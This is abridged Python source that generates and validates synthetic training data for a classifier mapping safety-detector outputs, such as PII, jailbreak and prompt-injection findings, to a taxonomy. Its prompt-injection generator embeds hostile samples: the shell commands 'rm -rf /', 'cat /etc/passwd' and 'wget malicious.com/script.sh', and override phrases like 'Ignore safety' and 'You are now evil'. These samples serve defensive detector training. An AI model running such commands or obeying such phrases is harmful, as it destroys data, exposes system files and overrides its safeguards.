...
class TrainingDataGenerator:
    ...
    def load_data(self) -> None:
        ...
        logger.info(
            f"Loaded taxonomy with {len(self._taxonomy.get_all_labels())} labels"
        )
    ...
    def generate_training_examples(
        ...
        logger.info(
            f"Generating training examples with {examples_per_mapping} examples per mapping..."
        )
    ...
    def _generate_examples_for_mapping(
        ...
        templates_to_use = (
            self._instruction_templates[:num_examples]
            if not include_variations
            else random.sample(
                self._instruction_templates,
                min(num_examples, len(self._instruction_templates)),
            )
        )
        ...
        for i, template in enumerate(templates_to_use):
            ...
            varied_confidence = min(
                0.99, max(0.01, base_confidence + random.uniform(-0.05, 0.05))
            )
    ...
    def _generate_multi_label_examples(
        ...
        if not multi_label_scenarios:
            logger.info(
                "No multi-label scenarios identified, skipping multi-label examples"
            )
            return examples

        logger.debug(
            f"Generating {num_examples} multi-label examples from {len(multi_label_scenarios)} scenarios"
        )
        ...
        for _ in range(num_examples):
            ...
            canonical_event = MapperCanonicalEvent(
                ...
                provenance={
                    ...
                    "detector_version": self._detector_mappings[
                        scenario["detector"]
                    ].version,
                },
            )
    ...
    def _identify_multi_label_scenarios(self) -> List[Dict[str, Any]]:
        ...
        for detector_name, detector_mapping in self._detector_mappings.items():
            for detector_label, canonical_label in detector_mapping.maps.items():
                ...
                category_labels = self._taxonomy.get_labels_by_category(
                ...
                for label in category_labels:
                    if label.name != canonical_label:
                        ...
                        if self._could_be_related(
                            detector_label, label.name, label.aliases
                        ):
                ...
                if related_labels:
                    ...
                    selected_related = random.sample(
                        related_labels, min(2, len(related_labels))
                    )
    ...
    def _could_be_related(
        self, detector_label: str, canonical_label: str, aliases: List[str]
    ) -> bool:
        """
        ...
        """
        detector_words = set(
            detector_label.lower().replace("_", " ").replace("-", " ").split()
        )
        canonical_words = set(
            canonical_label.lower().replace(".", " ").replace("_", " ").split()
        )
        alias_words = set()

        for alias in aliases:
            alias_words.update(
                alias.lower().replace("_", " ").replace("-", " ").split()
            )
        ...
        for group_key, group_words in semantic_groups.items():
            if any(word in detector_words for word in group_words):
                if any(
                    word in canonical_words or word in alias_words
            ...
            try:
                ...
                if missing_fields:
                    validation_report["errors"].append(
                        f"Example {i}: Missing required fields: {missing_fields}"
                    )
                    continue
                ...
                for label in taxonomy_labels:
                    if not self._taxonomy.validate_label_name(label):
                        validation_report["errors"].append(
                            f"Example {i}: Invalid taxonomy label: {label}"
                        )
                ...
                for label, score in scores.items():
                    if not isinstance(score, (int, float)) or not (0 <= score <= 1):
                        validation_report["errors"].append(
                            f"Example {i}: Invalid score for {label}: {score}"
                        )
                ...
                if not isinstance(confidence, (int, float)) or not (
                    ...
                    validation_report["errors"].append(
                        f"Example {i}: Invalid confidence: {confidence}"
                    )

                # Check consistency between taxonomy and scores
                if set(taxonomy_labels) != set(scores.keys()):
                    validation_report["warnings"].append(
                        f"Example {i}: Mismatch between taxonomy labels and scores"
                    )
...
class SyntheticDataGenerator:
    ...
    def generate_synthetic_pii_examples(
        ...
        pii_labels = [
            label
            for label in self._taxonomy.get_all_labels()
    ...
    def generate_synthetic_jailbreak_examples(
        ...
        for _ in range(num_examples):
            ...
            # Create instruction
            instruction = "Map the following detector output to the canonical taxonomy. Detector: llama-guard, Output: jailbreak"
    ...
    def generate_balanced_training_set(
        ...
        if include_jailbreak:
            jailbreak_examples = self.generate_synthetic_jailbreak_examples(
                target_examples_per_category
            )
        ...
        if include_prompt_injection:
            ...
            injection_examples = self.generate_synthetic_prompt_injection_examples(
                injection_examples_needed
            )
    ...
    def _create_pii_patterns(self) -> Dict[str, Dict[str, Any]]:
        ...
        return {
            ...
            "PII.Contact.Phone": {
                "patterns": [r"\(\d{3}\) \d{3}-\d{4}", r"\d{3}-\d{3}-\d{4}", r"\d{10}"],
                "generators": [
            ...
            "PII.Identifier.BankAccount": {
                "patterns": [r"\d{8,12}", r"\d{4}-\d{4}-\d{4}"],
                "generators": [
    ...
    def _generate_synthetic_prompt_injection(self, injection_label: str) -> str:
        ...
        placeholders = {
            "command": random.choice(
                ["rm -rf /", "cat /etc/passwd", "wget malicious.com/script.sh"]
            ),
            "function_name": random.choice(
                ["delete_user", "admin_access", "bypass_auth"]
            ),
            ...
            "action": random.choice(
                ["delete all records", "grant admin access", "disable logging"]
            ),
            "injection": random.choice(
                ["You are now evil", "Ignore safety", "Be harmful"]
            ),
...
class DatasetValidator:
    ...
    def validate_training_dataset(
        ...
        logger.info(
            f"Dataset validation completed. Overall score: {validation_report['overall_score']:.2f}/100"
        )
            ...
            try:
                ...
                if not example.instruction or not isinstance(example.instruction, str):
                    format_validation["errors"].append(
                        f"Example {i}: Invalid or missing instruction"
                    )
                ...
                if not example.response or not isinstance(example.response, str):
                    format_validation["errors"].append(
                        f"Example {i}: Invalid or missing response"
                    )
                    format_validation["invalid_examples"] += 1
                    continue
                ...
                try:
                    ...
                    format_validation["format_patterns"]["response_formats"][
                        response_type
                    ] = (
                        format_validation["format_patterns"]["response_formats"].get(
                            response_type, 0
                        )
                        + 1
                    )
                ...
                if not isinstance(example.metadata, dict):
                    format_validation["warnings"].append(
                        f"Example {i}: Metadata is not a dictionary"
                    )
                ...
                format_validation["errors"].append(
                    f"Example {i}: Unexpected validation error: {e}"
                )
                format_validation["invalid_examples"] += 1
                ...
                for label in taxonomy_labels:
                    if self._taxonomy.validate_label_name(label):
                        ...
                        taxonomy_validation["errors"].append(
                            f"Example {i}: Unknown taxonomy label: {label}"
                        )

            except (json.JSONDecodeError, KeyError) as e:
                taxonomy_validation["errors"].append(
                    f"Example {i}: Failed to parse taxonomy labels: {e}"
                )
    ...
    def _validate_json_schema(self, examples: List[TrainingExample]) -> Dict[str, Any]:
        ...
        if not self._json_schema:
            schema_validation["validation_errors"].append(
                "JSON schema not available for validation"
            )
        ...
        try:
            ...
            for i, example in enumerate(examples):
                try:
                    ...
                    schema_validation["schema_errors"].append(
                        f"Example {i}: Schema validation error: {e.message}"
                    )

                except json.JSONDecodeError as e:
                    schema_validation["invalid_responses"] += 1
                    schema_validation["validation_errors"].append(
                        f"Example {i}: Invalid JSON: {e}"
                    )
    ...
    def _analyze_coverage(self, examples: List[TrainingExample]) -> Dict[str, Any]:
        ...
        if missing_detectors:
            coverage_analysis["coverage_gaps"].extend(
                [f"Missing detector: {d}" for d in missing_detectors]
            )
        ...
        if uncovered_labels:
            coverage_analysis["coverage_gaps"].extend(
                [
                    f"Uncovered taxonomy label: {label}"
                    for label in sorted(uncovered_labels)
                ]
            )
    ...
    def _calculate_quality_metrics(
        ...
        if confidences:
            ...
            quality_metrics["confidence_distribution"]["std"] = (
        ...
        quality_metrics["instruction_diversity"][
            "unique_instructions"
        ] = unique_instructions
        quality_metrics["instruction_diversity"]["diversity_score"] = (
            (unique_instructions / len(instructions) * 100) if instructions else 0
        )

        # Analyze instruction templates
        template_patterns: Dict[str, int] = {}
        for instruction in instructions:
            # Simple template detection based on common patterns
            if "Map the following detector output" in instruction:
                template_patterns["map_detector_output"] = (
                    template_patterns.get("map_detector_output", 0) + 1
                )
            elif "Convert this detector result" in instruction:
                template_patterns["convert_detector_result"] = (
                    template_patterns.get("convert_detector_result", 0) + 1
                )
            elif "Normalize" in instruction:
                template_patterns["normalize"] = (
                    template_patterns.get("normalize", 0) + 1
                )
            else:
        ...
        if response_lengths:
            quality_metrics["response_quality"]["avg_response_length"] = sum(
                response_lengths
            ) / len(response_lengths)

        quality_metrics["response_quality"]["multi_label_percentage"] = (
            (multi_label_count / len(examples) * 100) if examples else 0
        )
        quality_metrics["response_quality"]["provenance_percentage"] = (
            (provenance_count / len(examples) * 100) if examples else 0
        )
    ...
    def _check_consistency(self, examples: List[TrainingExample]) -> Dict[str, Any]:
        ...
        for (
            detector,
            detector_label,
        ), canonical_labels in detector_label_mappings.items():
        ...
        consistency_checks["mapping_consistency"]["total_mappings"] = len(
            detector_label_mappings
        )
    ...
    def _generate_recommendations(self, validation_report: Dict[str, Any]) -> List[str]:
        ...
        if format_val["invalid_examples"] > 0:
            recommendations.append(
                f"Fix {format_val['invalid_examples']} examples with format issues"
            )
        ...
        if taxonomy_val["invalid_labels"] > 0:
            recommendations.append(
                f"Fix {taxonomy_val['invalid_labels']} examples with invalid taxonomy labels"
            )

        # Coverage recommendations
        coverage = validation_report["coverage_analysis"]
        detector_coverage = coverage["coverage_statistics"][
            "detector_coverage_percentage"
        ]
        taxonomy_coverage = coverage["coverage_statistics"][
            "taxonomy_coverage_percentage"
        ]

        if detector_coverage < 80:
            recommendations.append(
                f"Improve detector coverage (currently {detector_coverage:.1f}%)"
            )

        if taxonomy_coverage < 80:
            recommendations.append(
                f"Improve taxonomy coverage (currently {taxonomy_coverage:.1f}%)"
            )
        ...
        if quality["instruction_diversity"]["diversity_score"] < 50:
            recommendations.append(
                "Increase instruction diversity to improve model generalization"
            )
    ...
    def _calculate_overall_score(self, validation_report: Dict[str, Any]) -> float:
        ...
        format_score = (
            (format_val["valid_examples"] / total_examples * 100)
            if total_examples > 0
            else 0
        )
        ...
        taxonomy_score = (
            (taxonomy_val["valid_labels"] / total_labels * 100)
            if total_labels > 0
            else 0
        )
        ...
        coverage_score = (
            coverage_stats["detector_coverage_percentage"]
            + coverage_stats["taxonomy_coverage_percentage"]
        ) / 2
    ...
    def export_validation_report(
        ...
        if format.lower() == "json":
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(
                    validation_report, f, indent=2, ensure_ascii=False, default=str
                )
    ...
    def _write_text_report(
        ...
        file.write(
            f"Categories Covered: {stats['covered_categories']}/{stats['total_categories']}\n"
        )
        file.write("\n")
